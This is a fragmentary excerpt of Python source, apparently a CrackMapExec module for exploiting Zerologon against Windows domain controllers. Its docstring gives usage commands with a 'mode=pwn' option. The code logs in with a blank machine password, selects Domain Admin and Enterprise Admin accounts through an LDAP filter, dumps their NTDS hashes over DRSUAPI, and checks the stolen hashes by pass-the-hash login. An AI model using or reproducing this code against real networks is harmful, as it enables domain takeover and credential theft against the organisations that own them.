...
class CMEModule:
    ...
    def options(self, context, module_options):
        """
        crackmapexec smb DC-IP -u username -p password -M zerologon
        crackmapexec smb DC-IP -u username -p password -M zerologon -o mode=pwn
        """
        self.__pwn = False
        self.__vuln = False
...
class secretsdump_nano():
    ...
    def NTDSDump_BlankPass(self):
        ...
        searchFilter = f"(&(|(memberof=CN=Domain Admins,CN=Users,{self.__baseDN})(memberof=CN=Enterprise Admins,CN=Users,{self.__baseDN}))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        # Initialize smb connection for get into DRSUAPI method
        smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        # Blank password, lm & nt hashes
        smbConnection.login(self.__dcName, '', self.__domain, '', '')

        # Initialize remoteoperations
        #outputFileName = "{}_{}_domain_admins".format(self.dcName, self.remoteHost)
        remoteOps  = RemoteOperations(smbConnection=smbConnection, doKerberos=False, kdcHost=self.__kdcHost, ldapConnection=ldapConnection)
        nh = NTDSHashes(
            None,
            None,
            isRemote=True,
    ...
    def verifyCred(self, creds):
        for i in creds:
            ...
            try:
                smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
                smbConnection.login(username, '', self.__domain, '', nthash)
            except Exception as e:
